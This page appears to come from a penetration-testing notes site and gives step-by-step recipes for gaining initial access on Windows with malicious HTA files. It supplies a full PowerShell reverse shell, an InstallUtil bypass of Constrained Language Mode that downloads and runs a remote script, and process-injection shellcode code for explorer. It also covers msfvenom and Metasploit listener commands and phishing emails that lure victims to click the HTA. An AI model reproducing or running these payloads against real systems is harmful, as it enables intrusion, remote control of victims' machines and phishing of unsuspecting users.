---
title: HTA
sidebar_position: 5
---

### **`C#` for CLM Bypass with PS Script**

**Important Note** There are a few things to note about this code. First, the _System.Configuration.Install_namespace is missing an assembly reference in Visual Studio. We can add this by again right-clicking on *References* in the Solution Explorer and choosing *Add References...*. From here, we'll navigate to the *Assemblies* menu on the left-hand side and scroll down to *System.Configuration.Install*

**How the Bypass CLM Works** The bypass trick is not within the code but rather on the execution where we use `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe` (see step 6)

**Steps**

1. Create the `shell.ps1`, in this case it is just a normal reverse (no Meterpreter) shell without bypassing AMSI but you can improve this

```powershell
$client = New-Object System.Net.Sockets.TCPClient('[ATTACKER_IP]',[PORT]);$stream =$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

```

1. Create a new *Console App (.NET Framework)*

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method.");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer{
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "IEX(New-Object Net.WebClient).DownloadString('http://[Attacker_IP]/shell.ps1";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);

            ps.Invoke();

            rs.Close();
        }
    }
}

```

1. Add the missing references

```
Right-clicking on References in the Solution Explorer > Choosing Add References > Add System.Configuration.Install

Also add by browsing: C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll

```

1. Compile the project

```
Release & Any CPU (also x64 could work)

```

1. Encode the program

```powershell
certutil.exe -encode .\Bypass\bin\Release\Bypass.exe enc5.txt

```

1. Create the **`.hta`** file

```html
<html><head><script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("powershell iwr -uri http://[ATTACKER_IP]/enc5.txt -outfile C:\\Windows\\Tasks\\enc7.txt; powershell certutil -decode C:\\Windows\\Tasks\\enc7.txt C:\\Windows\\Tasks\\gimme3.exe;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile=/LogToConsole=false /U C:\\Windows\\Tasks\\gimme3.exe");
</script></head><body><script language="JScript">
self.close();
</script></body></html>
```

1. Find a way to deliver the `.hta` file to the user, can be also sending an email

```bash
swaks --body 'Please click here http://[ATTACKER_IP]/[MAL_FILE].hta' --add-header "MIME-Version: 1.0" --add-header "Content-Type: text/html" --header "Subject: Issues with mail" -t [TARGET_ADDRESS] -f attacker@test.com --server [SMTP_SERVER_IP]

sendEmail -s [SMTP_SERVER_IP] -t [TARGET_ADDRESS] -f attacker@test.com -u "Subject: Issues with mail" -o message-content-type=html -m "Please click here http://[ATTACKER_IP]/[MAL_FILE].hta" -a [MAL_FILE].hta

```

### **`C#` for CLM Bypass with DotNetToJScript**

**Steps**

1. Download the [DotNetToJScript](https://github.com/tyranid/DotNetToJScript) project from GitHub
2. Create the payload you want to execute, in this case a Meterpreter reverse shell

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ATTACKER_IP] LPORT=[PORT] EXITFUNC=thread -f csharp

```

1. Open *TestClass.cs* and insert this code

```csharp
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
//using System.Threading.Tasks;

[ComVisible(true)]
public class TestClass
{

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    public TestClass()
    {
        Process[] expProc = Process.GetProcessesByName("explorer");
        int pid = expProc[0].Id;
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
        byte[] buf = new byte[874] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
0xcc,0x00,0x00,...,0x48,0x31,0xd2,
0x89,0xda,0xff,0xd5};

        IntPtr outSize;

        WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}

```

1. Compile the project for *Release*
2. Convert the `.exe` to `.js`

```powershell
.\DotNetToJScript\bin\x64\Release\DotNetToJScript.exe .\ExampleAssembly\bin\x64\Release\ExampleAssembly.dll --lang=Jscript --ver=v4 -o payload.js

```

1. Create a `drop.hta` file and insert all the code from `payload.js`

```html
<html><head><script language="JScript">
// PASTE WHOLE JS FILE HERE
</script></head><body><script language="JScript">
self.close();
</script></body></html>
```

1. Start your listener

```bash
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKR_IP]; set lport [PORT]; exploit"

```

1. Start your HTTP Server

```bash
python3 -m http.server 80

```

1. Find a way to deliver the `.hta` file to the user and that he executes it, then you should get your reverse shell; remember that this hta file should be like a link or a shortcut and to works needs to be executed with `C:\Windows\System32\mshta.exe`, below is just an example for email

```bash
sendEmail -s [SNMP_SERVER] -t [VICTIM_EMAIL_ADDRESS] -f attacker@test.com -u "Subject: Issues with mail" -m "Please click here http://[ATTACKER_IP]/drop.hta" -a drop.hta

```

### **JScript from SuperSharpShooter**

**Steps**

1. Download the SuperSharpShooter project from [GitHub](https://github.com/ScriptIdiot/SuperSharpShooter)
2. Craft your Meterpreter payload

```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ATTACKER_IP] LPORT=[PORT] -f raw -o shell.txt

```

1. Run the tool to obtain the `.js` code, other options like AMSI evasion are available in the documentation of the GitHub

```bash
./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile shell.txt --payload js --output payload

```

1. Start your listener

```bash
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKR_IP]; set lport [PORT]; exploit"

```

1. Create a `.hta` file, and copy all the contents of the `payload.js` file into the below template

```html
<html><head><script language="JScript">
// INSERT CODE HERE
</script></head><body><script language="JScript">
self.close();
</script></body></html>
```

1. Start your HTTP Server

```bash
python3 -m http.server 80

```

1. Deliver it to the user, remember that it has to be in the form of a link, so it could be a link or a shortcut like the one below: `C:\Windows\System32\mshta.exe http://[ATTACKER_IP]/drop.hta`, below is just an example for email

```bash
sendEmail -s [SNMP_SERVER] -t [VICTIM_EMAIL_ADDRESS] -f attacker@test.com -u "Subject: Issues with mail" -m "Please click here http://[ATTACKER_IP]/drop.hta" -a drop.hta

```

HTA JScript Access

![HTA JScript Access](https://www.emmanuelsolis.com/img/hta_js_access.png)

